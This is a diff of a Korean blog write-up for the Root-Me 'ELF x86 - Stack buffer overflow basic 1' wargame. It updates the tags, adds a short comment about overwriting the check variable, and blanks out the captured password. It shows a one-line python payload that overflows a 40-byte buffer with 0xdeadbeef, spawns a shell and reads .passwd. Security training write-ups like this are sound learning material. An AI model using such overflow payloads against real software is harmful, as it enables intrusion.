@@ -2,10 +2,11 @@
 title: "[Root-Me] ELF x86 - Stack buffer overflow basic 1"
 excerpt: ""
 categories: 
-  - Root-Me
+  - Wargame
 tags: 
   - system
-last_modified_at: 2018-07-07T23:31:00+09:00
+  - root-me
+last_modified_at: 2018-07-08T22:35:00+09:00
 ---
 
 ## 문제
@@ -43,6 +44,11 @@ int main()
 }
 ```
 
+간만에 풀어보는 BOF 문제라 가물가물하면서 풀었던 문제.
+
+버퍼를 채워주고 check 부분을 덮어씌워 주니 해결
+
+
 ## 풀이
 ```
 app-systeme-ch13@challenge02:~$ (python -c 'print "a"*40+"\xef\xbe\xad\xde\n"';cat) | ./ch13
@@ -52,5 +58,5 @@ app-systeme-ch13@challenge02:~$ (python -c 'print "a"*40+"\xef\xbe\xad\xde\n"';c
 Yeah dude! You win!
 Opening your shell...
 cat .passwd
-1w4ntm0r3pr0np1s
+
 ```
